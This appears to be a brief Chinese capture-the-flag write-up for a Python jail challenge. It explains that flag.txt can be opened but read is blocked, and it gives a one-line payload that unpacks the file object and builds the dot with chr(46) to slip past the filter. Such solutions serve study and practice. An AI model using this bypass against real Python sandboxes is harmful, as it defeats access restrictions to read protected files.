发现flag在`flag.txt`里面，并且可以`open`，但是不能`read`，绕过`read`函数读取文件内容即可
payload：
```python
[*open("flag"+chr(46)+"txt")]
```